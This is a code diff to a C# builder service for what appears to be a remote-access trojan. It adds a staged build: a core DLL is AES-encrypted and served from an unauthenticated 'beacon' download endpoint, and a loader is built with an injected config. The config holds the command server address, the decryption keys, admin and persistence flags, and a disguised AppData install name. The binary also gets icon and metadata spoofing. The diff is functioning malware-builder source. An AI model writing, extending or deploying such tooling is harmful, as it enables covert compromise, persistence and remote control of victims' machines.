@@ -252,6 +252,20 @@ public class BuilderController : ControllerBase
         return Ok(new { status = "ok" });
     }
 
+    // ── Core DLL delivery (no auth — DLL is AES-encrypted) ─────────────
+
+    [HttpGet("/api/beacon/core/{buildId}")]
+    [AllowAnonymous]
+    public IActionResult DownloadCore(string buildId)
+    {
+        var corePath = Path.Combine(OutputBase, buildId, "core.bin");
+        if (!System.IO.File.Exists(corePath))
+            return NotFound(new { error = "Core not found." });
+
+        var bytes = System.IO.File.ReadAllBytes(corePath);
+        return File(bytes, "application/octet-stream", "core.bin");
+    }
+
     // ── Build engine ───────────────────────────────────────────────────
 
     private async Task RunBuildAsync(string buildId, BuildConfigRequest req, BuildJob job)
@@ -288,11 +302,6 @@ public class BuilderController : ControllerBase
             // Desktop mode: add --features desktop
             var featuresArg = req.ApplicationType == "Desktop" ? "--features desktop" : "";
 
-            // Build command
-            job.Log($"Building Rust agent (platform: {req.Platform}{(targetTriple != null ? ", target: " + targetTriple : "")}, mode: {req.ApplicationType})...");
-            var buildArgs = $"build --release {targetArg} {featuresArg} --target-dir \"{targetDir}\"";
-            job.Log($"cargo {buildArgs}");
-
             // Set RUSTFLAGS for strip if requested
             var envVars = new Dictionary<string, string>();
             if (req.StripSymbols)
@@ -301,40 +310,116 @@ public class BuilderController : ControllerBase
                 job.Log("Strip symbols enabled (RUSTFLAGS=-C strip=symbols)");
             }
 
-            var buildResult = await RunProcessAsync("cargo", buildArgs, job, RustAgentDir, envVars);
+            var isWindows = (targetTriple != null && targetTriple.Contains("windows")) || targetTriple == null;
 
-            if (buildResult.ExitCode != 0)
+            // ══════════════════════════════════════════════════════════════
+            // Stage 1: Build Core DLL
+            // ══════════════════════════════════════════════════════════════
+            job.Log("=== Stage 1: Building Core DLL ===");
+            var coreBuildArgs = $"build --release {targetArg} -p core --target-dir \"{targetDir}\"";
+            job.Log($"cargo {coreBuildArgs}");
+
+            var coreBuildResult = await RunProcessAsync("cargo", coreBuildArgs, job, RustAgentDir, envVars);
+            if (coreBuildResult.ExitCode != 0)
             {
-                job.Fail($"cargo build exited with code {buildResult.ExitCode}");
+                job.Fail($"Core build failed (exit code {coreBuildResult.ExitCode})");
                 UpdateHistory(job);
                 return;
             }
 
-            // Find output binary
+            // Find core output
             var releaseDir = targetTriple != null
                 ? Path.Combine(targetDir, targetTriple, "release")
                 : Path.Combine(targetDir, "release");
 
-            var isWindows = (targetTriple != null && targetTriple.Contains("windows")) || targetTriple == null;
-            var exeName = isWindows ? "agent.exe" : "agent";
-
-            var exePath = Path.Combine(releaseDir, exeName);
-            if (!System.IO.File.Exists(exePath))
+            var coreDllName = isWindows ? "core.dll" : "libcore.so";
+            var coreDllPath = Path.Combine(releaseDir, coreDllName);
+            if (!System.IO.File.Exists(coreDllPath))
             {
-                var found = Directory.GetFiles(releaseDir, "*")
-                    .FirstOrDefault(f => Path.GetFileName(f) == "agent" || Path.GetFileName(f) == "agent.exe");
-                if (found != null)
-                    exePath = found;
+                var found = Directory.GetFiles(releaseDir, "*core*")
+                    .FirstOrDefault(f => f.EndsWith(".dll") || f.EndsWith(".so") || f.EndsWith(".dylib"));
+                if (found != null) coreDllPath = found;
             }
 
-            if (!System.IO.File.Exists(exePath))
+            if (!System.IO.File.Exists(coreDllPath))
             {
-                job.Fail($"cargo build succeeded but output binary not found at {releaseDir}");
+                job.Fail($"Core DLL not found at {releaseDir}");
                 UpdateHistory(job);
                 return;
             }
 
-            job.Log($"Binary found: {exePath} ({new FileInfo(exePath).Length / 1024} KB)");
+            var coreDllBytes = await System.IO.File.ReadAllBytesAsync(coreDllPath);
+            job.Log($"Core DLL found: {coreDllPath} ({coreDllBytes.Length / 1024} KB)");
+
+            // ══════════════════════════════════════════════════════════════
+            // Stage 2: Encrypt Core DLL
+            // ══════════════════════════════════════════════════════════════
+            job.Log("=== Stage 2: Encrypting Core DLL ===");
+
+            // Generate AES-256 key
+            var aesKey = RandomNumberGenerator.GetBytes(32);
+
+            // AES-256-GCM encrypt the core DLL
+            var aesNonce = RandomNumberGenerator.GetBytes(12);
+            using var aes = new AesGcm(aesKey, 16);
+            var ciphertext = new byte[coreDllBytes.Length];
+            var tag = new byte[16];
+            aes.Encrypt(aesNonce, coreDllBytes, ciphertext, tag);
+
+            // Combine: nonce(12) || ciphertext || tag(16)
+            var encryptedCore = new byte[aesNonce.Length + ciphertext.Length + tag.Length];
+            Buffer.BlockCopy(aesNonce, 0, encryptedCore, 0, aesNonce.Length);
+            Buffer.BlockCopy(ciphertext, 0, encryptedCore, aesNonce.Length, ciphertext.Length);
+            Buffer.BlockCopy(tag, 0, encryptedCore, aesNonce.Length + ciphertext.Length, tag.Length);
+
+            // Save encrypted core
+            var coreBinPath = Path.Combine(tempDir, "core.bin");
+            await System.IO.File.WriteAllBytesAsync(coreBinPath, encryptedCore);
+            job.Log($"Encrypted core saved: {encryptedCore.Length / 1024} KB");
+
+            // Generate RSA-2048 keypair
+            using var rsa = RSA.Create(2048);
+            var rsaPublicKey = Convert.ToBase64String(rsa.ExportSubjectPublicKeyInfo());
+            var rsaPrivateKey = Convert.ToBase64String(rsa.ExportPkcs8PrivateKey());
+
+            // RSA-OAEP encrypt the AES key
+            var encryptedAesKey = rsa.Encrypt(aesKey, RSAEncryptionPadding.OaepSHA256);
+            var encryptedAesKeyB64 = Convert.ToBase64String(encryptedAesKey);
+
+            job.Log("AES key generated, RSA keypair created, AES key encrypted");
+
+            // ══════════════════════════════════════════════════════════════
+            // Stage 3: Build Loader
+            // ══════════════════════════════════════════════════════════════
+            job.Log("=== Stage 3: Building Loader ===");
+            var loaderBuildArgs = $"build --release {targetArg} -p loader --target-dir \"{targetDir}\"";
+            job.Log($"cargo {loaderBuildArgs}");
+
+            var loaderBuildResult = await RunProcessAsync("cargo", loaderBuildArgs, job, RustAgentDir, envVars);
+            if (loaderBuildResult.ExitCode != 0)
+            {
+                job.Fail($"Loader build failed (exit code {loaderBuildResult.ExitCode})");
+                UpdateHistory(job);
+                return;
+            }
+
+            var loaderExeName = isWindows ? "loader.exe" : "loader";
+            var exePath = Path.Combine(releaseDir, loaderExeName);
+            if (!System.IO.File.Exists(exePath))
+            {
+                var found = Directory.GetFiles(releaseDir, "*")
+                    .FirstOrDefault(f => Path.GetFileName(f) == "loader" || Path.GetFileName(f) == "loader.exe");
+                if (found != null) exePath = found;
+            }
+
+            if (!System.IO.File.Exists(exePath))
+            {
+                job.Fail($"Loader binary not found at {releaseDir}");
+                UpdateHistory(job);
+                return;
+            }
+
+            job.Log($"Loader binary found: {exePath} ({new FileInfo(exePath).Length / 1024} KB)");
 
             // ── Icon & metadata embedding via rcedit (Windows PE only) ──
             if (isWindows && HasIconOrMetadata(req))
@@ -342,8 +427,10 @@ public class BuilderController : ControllerBase
                 await EmbedIconAndMetadata(req, exePath, job);
             }
 
-            // ── Config injection: append CONFIG_MAGIC + length + JSON ──
-            job.Log("Injecting build config...");
+            // ══════════════════════════════════════════════════════════════
+            // Stage 4: Inject Config into Loader
+            // ══════════════════════════════════════════════════════════════
+            job.Log("=== Stage 4: Injecting Config ===");
             var serverUrl = $"http://{req.ServerHost}:{req.ServerPort}";
             var injectedConfig = new InjectedConfig
             {
@@ -357,6 +444,9 @@ public class BuilderController : ControllerBase
                 require_admin = req.RequireAdmin,
                 copy_to_path = req.CopyToAppData ? "LibraNextgen" : null,
                 enable_persistence = req.EnablePersistence,
+                encrypted_aes_key = encryptedAesKeyB64,
+                core_download_path = $"/api/beacon/core/{buildId}",
+                rsa_private_key = rsaPrivateKey,
             };
 
             var configJson = JsonSerializer.Serialize(injectedConfig);
@@ -406,9 +496,13 @@ public class BuilderController : ControllerBase
             Directory.CreateDirectory(finalDir);
             System.IO.File.Copy(exePath, finalPath, true);
 
+            // Copy encrypted core DLL to final output for the delivery API
+            var finalCorePath = Path.Combine(finalDir, "core.bin");
+            System.IO.File.Copy(coreBinPath, finalCorePath, true);
+
             var fileInfo = new FileInfo(finalPath);
             job.Complete(fileInfo.Length);
-            job.Log($"Build complete: {finalPath} ({fileInfo.Length / 1024} KB)");
+            job.Log($"Build complete: {finalPath} ({fileInfo.Length / 1024} KB), core.bin ({encryptedCore.Length / 1024} KB)");
 
             UpdateHistory(job);
         }
